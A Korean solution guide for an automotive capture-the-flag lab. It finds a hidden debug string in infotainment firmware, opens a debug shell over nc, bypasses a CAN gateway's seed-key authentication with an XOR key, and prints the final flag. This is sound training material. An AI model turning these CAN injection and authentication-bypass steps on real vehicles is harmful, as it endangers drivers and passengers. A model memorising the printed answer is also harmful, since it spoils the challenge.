# ECU CTF 솔루션 가이드

## 환경 설정
```bash
# 환경 생성
curl -X POST http://ctf-server:8080/start
# 응답: {"session_id": "...", "host": "...", "port": 12345, "firmware_download": "..."}

# 펌웨어 다운로드
wget http://ctf-server:8080/firmware/session_xxx
```

## 1단계: 펌웨어 분석
```bash
# 문자열 분석
strings infotainment_firmware.bin | grep -i debug
# 결과: ENABLE_DEBUG_MODE_12345

# 또는 바이너리 분석
objdump -d infotainment_firmware.bin | grep -A 10 -B 10 "ENABLE"
```

## 2단계: 인포테인먼트 침투
```bash
# 인포테인먼트 접속
nc <host> <port>

# 메뉴에서 3번 (Diagnostics) 선택
3

# 디버그 모드 활성화 문자열 입력
ENABLE_DEBUG_MODE_12345

# 메뉴에서 9번 (Debug Menu) 선택
9

# 쉘 명령 실행
shell
```

## 3단계: CAN 네트워크 분석
```bash
# CAN 인터페이스 확인
ip link show vcan0

# CAN 트래픽 모니터링
candump vcan0

# 테스트 메시지 전송
cansend vcan0 123#27011234
```

## 4단계: 게이트웨이 인증 우회
```bash
# 시드 요청
cansend vcan0 123#2701

# 응답 수신 (예: 124#67011234)
# 시드값: 0x1234

# 키 계산: seed XOR 0x1337
# 0x1234 XOR 0x1337 = 0x0103

# 키 전송
cansend vcan0 123#27020103

# 인증 성공 응답: 124#6702
```

## 5단계: 엔진 ECU 접근
```bash
# 루틴 시작
cansend vcan0 123#31011234

# 엔진 ECU 활성화 후 플래그 확인
# 최종 플래그: CTF{engine_ecu_compromised_final_flag}
